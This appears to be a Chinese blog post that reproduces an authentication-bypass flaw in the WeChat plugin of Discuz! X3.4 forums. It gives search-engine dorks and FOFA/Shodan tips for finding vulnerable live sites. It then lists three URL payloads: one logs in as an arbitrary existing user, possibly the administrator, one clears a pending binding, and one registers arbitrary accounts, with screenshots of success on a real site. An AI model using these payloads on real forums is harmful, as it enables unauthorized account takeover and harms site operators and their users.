## 前言

下午回到宿舍看到文章，特地复现一波  
文章来源：

https://gitee.com/ComsenzDiscuz/DiscuzX/issues/IPRUI
<https://www.sk15.net/archives/119.html>

google语法:intext:Powered by Discuz! X3.2 Licensed 扫一扫，访问微社区

## 正文

上fofa或zoomeye或shodan用语法找给dz3.4的站来测试  
![](https://s2.ax1x.com/2019/02/18/kcMOlq.png)

文章给出的payload有三个

```php 
随机登陆一个账号(登录tmp里的的第一个用户，如果admin在第一个就可以直接登admin)
/plugin.php?id=wechat:wechat&ac=wxregister&username={username}

清空tmp

/plugin.php?id=wechat:wechat&ac=unbindmp&uid={uid}&hash={csrf_hash}

注册账号

/plugin.php?id=wechat:wechat&ac=wxregister&username={username}&wxopenid=abcdefg
```
第一个payload测试

`php http://www.xxx.com/plugin.php?id=wechat:wechat&ac=wxregister&username=disjkdjsaiodasd`![](https://s2.ax1x.com/2019/02/18/kcQm7D.md.png)

返回主页刷新一下(注意右上角)  
![](https://s2.ax1x.com/2019/02/18/kcQ09s.png)

第二个payload是清空tmp的，清空后第一个payload就无法使用所以这里不测试

第三个payload是任意注册用户的

`php /plugin.php?id=wechat:wechat&ac=wxregister&username={填你自己想的用户名}&wxopenid={这里的id可以乱填}`比如下图所示：  
![](https://s2.ax1x.com/2019/02/18/kcQv8A.png)

返回主页刷新  
![](https://s2.ax1x.com/2019/02/18/kcQzvt.png)

成功注册  
![](https://s2.ax1x.com/2019/02/18/kclCb8.png)

只要安了微信插件的有可能可以